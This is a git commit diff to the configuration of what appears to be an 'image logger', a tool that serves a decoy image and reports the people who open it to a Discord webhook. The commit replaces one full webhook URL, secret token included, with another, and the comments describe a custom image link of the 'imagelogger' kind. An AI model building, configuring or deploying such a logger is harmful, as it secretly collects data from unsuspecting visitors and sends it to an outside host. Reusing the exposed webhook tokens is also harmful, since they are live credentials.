e26f30a53331954bd45dfcb85c31ce14c84682ba
hypix22 <lillebror22@icloud.com>
2025-09-01 17:36:39 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1387882750564110346/bSZE3dsx7hvgnUVoePCX1hjjXXQEu3hrMnwxGbOC0rL3HNvdsp3vrJgGkRCRpXaqk2If",
+    "webhook": "https://discord.com/api/webhooks/1412098724120891522/BtLs7Q2U76LXLIg4UssVbWWYXNkfPOGDMWuOY_D3OlUSiYdY9xZCD6QIkgLmxnTOtxha",
     "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
